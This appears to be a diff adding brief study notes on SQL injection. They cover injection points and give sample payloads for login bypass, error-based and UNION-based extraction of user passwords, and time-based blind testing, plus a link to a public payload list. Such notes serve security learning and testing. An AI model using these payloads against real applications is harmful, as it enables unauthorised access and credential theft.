@@ -1,0 +1,30 @@
+This part is mainly discussed about SQL injection attack.
+
+1.Where can we inject our malicious SQL request?
+IP--->Port--->Host Header--->Path--->Form
+
+2.Bypass the authentication:
+Input below grammar, you could bypass the detection for authentication:
+'or 1=1 --//
+
+3.Error-based(In-bound) SQLi:
+Input below grammar, you could disclose some sensitive info from the feedback error message:
+'or 1=1 in (select @@version)--// #disclose the version of dbms
+'or 1=1 in (select password from users)--// #disclose the password from users table
+
+4.Union-based SQLi:
+Input below union grammar, you could also disclose some sensitive info.But u need to ensure the count
+of column you desire is as same as the count of coulmn the DB table actually has by 'ORDER BY 1--//.
+If not identical, u maybe go to the fail:
+'UNION SELECT null, username, password, description, null FROM users --//
+
+5.Blind-based SQLi:
+Sometimes, as you input SQLi, the DBMS may not feedback to u. So if u would like to check whether attack 
+successes or not, u could input below grammar to check:
+'AND IF (1=1, sleep(3), 'false') --//
+According to above grammar, if your attack successes, the DBMS would go to if loop and sleep for 3 seconds. 
+But if your attack fails, the DBMS would feedback fail message to u.
+
+Below is SQLi payload list:
+https://github.com/payloadbox/sql-injection-payload-list
+
